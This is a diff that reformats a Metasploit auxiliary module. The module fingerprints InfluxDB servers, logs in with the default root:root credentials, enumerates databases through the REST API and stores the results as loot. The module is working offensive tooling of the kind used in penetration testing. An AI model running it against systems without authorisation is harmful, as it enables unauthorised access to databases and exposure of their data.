@@ -8,24 +8,25 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'InfluxDB Enum Utility',
-      'Description'    => %q{
-        This module enumerates databases on InfluxDB using the REST API using the
-        default authentication of root:root.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'InfluxDB Enum Utility',
+        'Description' => %q{
+          This module enumerates databases on InfluxDB using the REST API using the
+          default authentication of root:root.
+        },
+        'References' => [
           ['URL', 'https://docs.influxdata.com/influxdb/v2.1/'],
           ['URL', 'https://www.shodan.io/search?query=X-Influxdb-Version']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
           'Nixawk'
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
@@ -34,67 +35,66 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to login as', 'root']),
         OptString.new('PASSWORD', [true, 'The password to login with', 'root']),
         OptString.new('QUERY', [true, 'The influxdb query syntax', 'SHOW DATABASES'])
-      ])
+      ]
+    )
   end
 
   def run
-    begin
-      # Check the target if is a influxdb server
-      res = send_request_cgi(
-        'uri'    => normalize_uri(target_uri.path),
-        'method' => 'GET'
-      )
+    # Check the target if is a influxdb server
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path),
+      'method' => 'GET'
+    )
 
-      return if res.nil?
-      return if res.headers['X-Influxdb-Version'].nil?
+    return if res.nil?
+    return if res.headers['X-Influxdb-Version'].nil?
 
-      print_good("#{peer} - Influx Version: #{res.headers['X-Influxdb-Version']}")
+    print_good("#{peer} - Influx Version: #{res.headers['X-Influxdb-Version']}")
 
-      # Send http auth to the target
-      # curl http://127.0.0.1:8086/query?q=SHOW+DATABASES
-      # curl -X POST http://127.0.0.1:8086/query --data 'q=SHOW DATABASES'
-      res = send_request_cgi(
-        'uri'           => normalize_uri(target_uri.path, '/query'),
-        'method'        => 'GET',
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'vars_get'      => {
-          'q'           => datastore['QUERY']
-        }
-      )
+    # Send http auth to the target
+    # curl http://127.0.0.1:8086/query?q=SHOW+DATABASES
+    # curl -X POST http://127.0.0.1:8086/query --data 'q=SHOW DATABASES'
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, '/query'),
+      'method' => 'GET',
+      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+      'vars_get' => {
+        'q' => datastore['QUERY']
+      }
+    )
 
-      return if res.nil?
-      return if res.headers['X-Influxdb-Version'].nil?
+    return if res.nil?
+    return if res.headers['X-Influxdb-Version'].nil?
 
-      # Check http auth status
-      case res.code
-      when 401
-        fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate. Invalid username/password.")
-      when 200
+    # Check http auth status
+    case res.code
+    when 401
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate. Invalid username/password.")
+    when 200
 
-        begin
-          jsonres = JSON.parse(res.body)
-          return if jsonres.nil?
-          return if jsonres['results'].nil?
+      begin
+        jsonres = JSON.parse(res.body)
+        return if jsonres.nil?
+        return if jsonres['results'].nil?
 
-          result = JSON.pretty_generate(jsonres)
-          vprint_good("#{peer} - Influx DB Found:\n\n#{result}\n")
-          path = store_loot(
-            'influxdb.enum',
-            'text/plain',
-            rhost,
-            result,
-            'InfluxDB Enum'
-          )
-          print_good("File saved in: #{path}")
-        rescue JSON::ParserError
-          fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
-        end
-
-      else
-        fail_with(Failure::Unknown, "#{peer} - Unexpected response status #{res.code}")
+        result = JSON.pretty_generate(jsonres)
+        vprint_good("#{peer} - Influx DB Found:\n\n#{result}\n")
+        path = store_loot(
+          'influxdb.enum',
+          'text/plain',
+          rhost,
+          result,
+          'InfluxDB Enum'
+        )
+        print_good("File saved in: #{path}")
+      rescue JSON::ParserError
+        fail_with(Failure::Unknown, "#{peer} - Unexpected response, cannot parse JSON")
       end
-    rescue ::Rex::ConnectionError
-      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the influx db server.")
+
+    else
+      fail_with(Failure::Unknown, "#{peer} - Unexpected response status #{res.code}")
     end
+  rescue ::Rex::ConnectionError
+    fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the influx db server.")
   end
 end
